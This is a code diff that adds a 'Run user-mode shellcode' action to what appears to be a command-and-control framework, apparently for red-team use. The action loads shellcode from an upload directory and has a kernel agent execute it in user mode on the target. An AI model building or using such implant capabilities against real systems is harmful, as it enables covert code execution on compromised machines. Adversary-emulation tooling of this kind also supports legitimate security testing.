@@ -89,6 +89,25 @@ def set_registry_key(key=None, subkey_name=None, subkey_type=None, subkey_value=
     return action
 
 
+def run_user_mode_shellcode(shellcode_filename=None):
+    if shellcode_filename is None:
+        commands_list = ["usermode <shellcode_bytes>"]
+    else:
+        filename = shellcode_filename.split('/')[-1]
+        with open(os.path.join('/usr/src/app/c2/connections/upload_dir', filename), 'rb') as f:
+            data = f.read()
+        data = data[:1451]
+        commands_list = [b"usermode " + data]
+    parser = c2parsers.null_parser
+    required_facts = []
+    name = "Run user-mode shellcode"
+    description = "Make the kernel agent allocate a kernel thread, which in turn makes a transition to " \
+                  "user-mode, executing the user-level shellcode provided as input; this action takes " \
+                  "as positional parameter the name of a file in the upload_dir folder"
+    action = C2Action(commands_list, parser, required_facts, name, description)
+    return action
+
+
 def install_schtask():
     commands_list = []
     parser = c2parsers.null_parser
